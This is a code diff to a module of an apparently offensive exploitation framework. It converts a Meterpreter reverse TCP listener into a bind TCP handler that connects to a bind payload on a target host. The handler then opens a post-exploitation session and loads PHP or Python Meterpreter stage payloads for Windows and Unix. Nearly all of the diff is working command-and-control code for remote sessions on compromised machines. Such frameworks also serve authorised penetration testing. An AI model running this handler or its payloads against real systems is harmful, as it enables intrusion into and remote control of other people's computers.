@@ -8,22 +8,22 @@ import time
 import struct
 
 class Module(Listener):
-    """Meterpreter reverse TCP listener with advanced post-exploitation features"""
-    
+    """Meterpreter bind TCP handler — connects to a bind payload on the target"""
+
     __info__ = {
-        'name': 'Meterpreter Reverse TCP',
-        'description': 'Advanced Meterpreter-like reverse TCP listener with post-exploitation capabilities',
+        'name': 'Meterpreter Bind TCP',
+        'description': 'Meterpreter bind TCP handler with post-exploitation capabilities',
         'author': 'KittySploit Team',
         'version': '1.0.0',
-        'handler': Handler.REVERSE,
+        'handler': Handler.BIND,
         'session_type': SessionType.METERPRETER,
         'references': [
             'https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/'
         ]
     }
 
-    lhost = OptString("127.0.0.1", "Local IPv4 or IPv6 address", True)
-    lport = OptPort(4444, "Local TCP port", True)
+    rhost = OptString("127.0.0.1", "Target IPv4 or IPv6 address", True)
+    rport = OptPort(4444, "Target bind TCP port", True)
 
     def __init__(self, framework=None):
         super().__init__(framework)
@@ -58,166 +58,68 @@ class Module(Listener):
             self.session_type = session_type_value
     
     def run(self, background=False):
-        """Run the Meterpreter reverse TCP listener"""
+        """Connect to a Meterpreter bind TCP payload on the target"""
         try:
-            # Get option values
-            lhost = str(self.lhost) if self.lhost else "127.0.0.1"
-            lport = int(self.lport) if self.lport else 4444
-            
+            rhost = str(self.rhost) if self.rhost else "127.0.0.1"
+            rport = int(self.rport) if self.rport else 4444
+
             print_info(f"Starting {self.name}...")
-            print_info(f"Listening on {lhost}:{lport}")
-            print_warning("Waiting for connection...")
-            
+            print_status(f"Trying to connect to {rhost}:{rport}")
+            print_warning("Ensure the bind payload is running on the target...")
+
             if background:
-                print_info("Running in background mode")
-            else:
-                print_info("Press Ctrl+C to stop the listener")
-            
-            # Start listener in a separate thread
-            self.running = True
-            self.listener_thread = threading.Thread(target=self._start_listener, args=(lhost, lport))
-            self.listener_thread.daemon = True
-            self.listener_thread.start()
-            
-            if background:
-                # Return immediately in background mode
+                self.running = True
+                self.listener_thread = threading.Thread(
+                    target=self._connect_to_target, args=(rhost, rport)
+                )
+                self.listener_thread.daemon = True
+                self.listener_thread.start()
                 return True
-            
-            # Wait for connection to be accepted and session to be created
-            # Wait indefinitely until connection or Ctrl+C
-            try:
-                # Use a loop with short timeout to allow KeyboardInterrupt to be caught
-                while self.running:
-                    # Wait for session to be created with short timeout to check for Ctrl+C
-                    if self.session_created_event.wait(timeout=0.5):  # Check every 0.5 seconds
-                        # Session created, stop listener and return session_id
-                        self.running = False
-                        if self.created_session_id:
-                            print_info("Session created. Listener stopped.")
-                            return self.created_session_id
-                        break
-            except KeyboardInterrupt:
-                print_info("\n[!] Interrupted by user")
-                self.running = False
-            
-            # Return session_id if one was created, otherwise return True
+
+            self.running = True
+            self._connect_to_target(rhost, rport)
+
+            if self.created_session_id:
+                print_info("Session created.")
+                return self.created_session_id
             return self.created_session_id if self.created_session_id else True
-            
+
+        except KeyboardInterrupt:
+            print_info("\n[!] Interrupted by user")
+            self.running = False
+            return False
         except Exception as e:
-            print_error(f"Error starting listener: {e}")
+            print_error(f"Error starting handler: {e}")
             return False
         finally:
             if not background:
                 self.shutdown()
-    
-    def _check_port_available(self, host, port):
-        """Check if port is available by trying to bind to it"""
-        test_sock = None
+
+    def _connect_to_target(self, rhost, rport):
+        """Connect to the target bind payload and establish a Meterpreter session"""
+        client_socket = None
         try:
-            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)  # Don't reuse for check
-            test_sock.settimeout(1.0)
-            test_sock.bind((host, port))
-            test_sock.close()
-            return True
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            client_socket.settimeout(30.0)
+            client_socket.connect((rhost, rport))
+            client_socket.settimeout(None)
+            self.sock = client_socket
+
+            print_success(f"Connected to {rhost}:{rport}")
+            self._handle_connection(client_socket, (rhost, rport))
+        except ConnectionRefusedError:
+            print_error(f"Connection refused by {rhost}:{rport}")
+            self.session_created_event.set()
         except OSError as e:
-            # Check if it's a "port already in use" error
-            error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
-            if error_code in [10048, 98, 48]:  # Windows: 10048, Linux: 98, macOS: 48
-                return False
-            # Other OSError - might be permission issue, but port might be available
-            return True
-        except Exception:
-            # Other errors - assume port might be available
-            return True
-        finally:
-            if test_sock:
-                try:
-                    test_sock.close()
-                except:
-                    pass
-    
-    def _start_listener(self, host, port):
-        """Start the listener in a separate thread"""
-        try:
-            # Check if port is already in use
-            if not self._check_port_available(host, port):
-                print_error(f"Port {port} is already in use. Cannot start listener.")
-                print_error("Please stop the existing listener or use a different port.")
-                self.running = False
-                return
-            
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Don't use SO_REUSEADDR to prevent binding to an already used port
-            # This ensures we get an error if the port is already in use
-            # Use a longer timeout to check if we should stop (1 second)
-            # This allows checking self.running periodically
-            self.sock.settimeout(1.0)
-            
-            try:
-                self.sock.bind((host, port))
-            except OSError as e:
-                # Check if it's a "port already in use" error
-                error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
-                error_msg = str(e)
-                if error_code in [10048, 98, 48] or 'already in use' in error_msg.lower() or 'address already in use' in error_msg.lower():
-                    print_error(f"Port {port} is already in use. Cannot start listener.")
-                    print_error("Please stop the existing listener or use a different port.")
-                    self.running = False
-                    if self.sock:
-                        try:
-                            self.sock.close()
-                        except:
-                            pass
-                        self.sock = None
-                    return
-                else:
-                    # Re-raise other OSError
-                    raise
-            
-            self.sock.listen(5)
-            
-            print_success(f"Listening on {host}:{port}")
-            
-            # Accept only one connection
-            while self.running:
-                try:
-                    client_socket, address = self.sock.accept()
-                    if not self.running:  # Check if we should still accept
-                        client_socket.close()
-                        break
-                    
-                    print_success(f"Connection received from {address[0]}:{address[1]}")
-                    
-                    # Handle the connection (blocking - wait for session creation)
-                    self._handle_connection(client_socket, address)
-                    
-                    # Stop listening after handling the connection
-                    self.running = False
-                    break
-                        
-                except socket.timeout:
-                    # Timeout occurred, check if we should continue
-                    continue
-                except OSError as e:
-                    if self.running:
-                        print_error(f"Error accepting connection: {e}")
-                    break
-                except Exception as e:
-                    if self.running:
-                        print_error(f"Error accepting connection: {e}")
-                    break
-                    
+            print_error(f"Connection error: {e}")
+            self.session_created_event.set()
         except Exception as e:
             if self.running:
-                print_error(f"Error in listener thread: {e}")
+                print_error(f"Error connecting to target: {e}")
+            self.session_created_event.set()
         finally:
-            if self.sock:
-                try:
-                    self.sock.close()
-                except:
-                    pass
-                self.sock = None
+            self.running = False
     
     def _handle_connection(self, client_socket, address):
         """Handle incoming connection"""
@@ -282,7 +184,7 @@ class Module(Listener):
                 client_socket,
                 address,
                 {
-                    'handler_type': Handler.REVERSE.value,
+                    'handler_type': Handler.BIND.value,
                     'session_type': SessionType.METERPRETER.value,
                     'meterpreter_version': '1.0.0'
                 }
@@ -463,26 +365,24 @@ class Module(Listener):
             if self.framework and hasattr(self.framework, 'module_loader'):
                 if stage_language == 'php':
                     payload_paths = [
-                        'payloads/singles/php/meterpreter_php_reverse_tcp',
-                        'payloads/singles/php/meterpreter_reverse_tcp'
+                        'payloads/singles/php/meterpreter_php_bind_tcp',
+                        'payloads/singles/php/meterpreter_bind_tcp'
                     ]
                 else:
-                    # Try Windows payload first, then fallback to Unix
                     payload_paths = [
-                        'payloads/singles/cmd/windows/python_meterpreter_reverse_tcp',
-                        'payloads/singles/cmd/unix/python_meterpreter_reverse_tcp'
+                        'payloads/singles/cmd/windows/python_meterpreter_bind_tcp',
+                        'payloads/singles/cmd/unix/python_meterpreter_bind_tcp'
                     ]
-                
+
                 for payload_path in payload_paths:
                     try:
                         payload_module = self.framework.module_loader.load_module(payload_path, framework=self.framework)
-                        
+
                         if payload_module:
-                            # Set lhost and lport if needed
-                            if hasattr(payload_module, 'lhost'):
-                                payload_module.set_option('lhost', self.lhost)
-                            if hasattr(payload_module, 'lport'):
-                                payload_module.set_option('lport', self.lport)
+                            if hasattr(payload_module, 'rhost'):
+                                payload_module.set_option('rhost', self.rhost)
+                            if hasattr(payload_module, 'rport'):
+                                payload_module.set_option('rport', self.rport)
                             
                             if hasattr(payload_module, 'get_stage_code'):
                                 stage_code = payload_module.get_stage_code()
@@ -635,8 +535,8 @@ class Module(Listener):
     def get_handler_info(self):
         """Get handler information"""
         info = {
-            'handler': Handler.REVERSE.value,
-            'handler_enum': Handler.REVERSE,
+            'handler': Handler.BIND.value,
+            'handler_enum': Handler.BIND,
             'session_type': SessionType.METERPRETER.value,
             'session_enum': SessionType.METERPRETER,
             'meterpreter_version': '1.0.0',
